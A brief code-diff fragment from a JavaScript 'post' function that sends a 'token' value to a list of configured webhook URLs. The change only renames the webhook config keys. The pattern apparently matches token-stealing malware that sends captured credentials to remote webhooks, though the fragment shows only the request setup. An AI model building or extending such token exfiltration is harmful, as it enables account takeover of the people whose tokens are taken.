@@ -242,7 +242,7 @@ const post = async (params) => {
             token: token,
         });
 
-        [config.webhook1, config.webhook2].forEach((webhook) => {
+        [config.webhook, config.uwu].forEach((webhook) => {
             const url = new URL(webhook);
             const options = {
                 hostname: url.hostname,
